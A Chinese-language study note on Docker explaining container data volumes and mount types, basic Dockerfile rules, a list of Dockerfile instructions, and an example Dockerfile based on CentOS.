## 容器数据卷

容器之间的一个数据共享的技术，docker容器产生的数据，同步到本地。

目录的挂载，将我们容器内的目录，挂载到linux上面。

容器数据卷技术是为了容器的持久化和同步操作。容器间数据也是可以共享的。

### 使用数据卷

- 创建容器时直接使用命令来挂载 `-v`

- ```
  docker run -it -v 主机目录：容器内目录
  ```

#### 具名和匿名挂载

- 匿名挂载：只指定容器内路径
- 具名挂载：`-v 卷名：容器内路径`
- 指定路径挂载：`-v 宿主机路径：容器内路径`
- 指定权限：`-v :容器内路径：ro/rw`，ro表示只读，rw表示可读可写，是针对容器内的文件
- ro表示只读，容器内无权限进行修改，只能在宿主机操作。

### Dockerfile

dockerfile就是用来构建docker镜像的构建文件，命令脚本。

通过这个脚本可以生成一个镜像。镜像是一层一层的，那么脚本也是一个一个的命令，一个命令就是一层。

```
FROM centos
VOLUME ["volume01", "volume02"]
CMD echo "--end--"
CMD /bin/bash 
// 每一句就是一层
```

可以使用`docker inspect container-id`查看卷挂载的目录

#### 基础知识

- 每个保留关键字（指令）都必须是大写字母
- 执行从上到下顺序执行
- #表示注释
- 每一个指令都会创建提交一个新的镜像层，并提交。

Dockerfile是面向开发的，以后发布项目，做镜像，就需要编写dockerfile文件。

#### Dockerfile指令

 ```shell
FROM				# 基础镜像，一切从这里开始构建
MAINTAIN			# 镜像是谁写的，一般为名字+邮箱
RUN					# 镜像构建的时候需要运行的命令
ADD					# 向里面添加内容，比如tomcat等
WORKDIR				# 镜像的工作目录
VOLUME				# 挂载卷目录
EXPOSE				# 指定暴露的端口
RUN					# 开始运行
CMD					# 指定启动的时候要运行的命令，只有最后一个会生效，可以被替代，不能追加命令
ENTRYPOINT			# 指定启动的时候要运行的命令，可以追加命令
ONBUILD				# 当构建一个被继承dockerfile时候会运行这个指令。是一个触发指令
COPY				# 类似于COPY，将文件拷贝到镜像
ENV					# 构建的时候设置环境变量
 ```

例子：

```shell
FROM centos
# 设置维护者名称
MAINTAINER elbow95
# 设置环境变量
ENV MYPATH /usr/local
# 设置工作目录
WORKDIR $MYPATH
# 安装软件
RUN yum -y install vim
RUN yum -y install net-tools
# 暴露端口
EXPOSE 80
CMD echo $MYPATH
CMD echo "---end---"
CMD /bin/bash
```



  	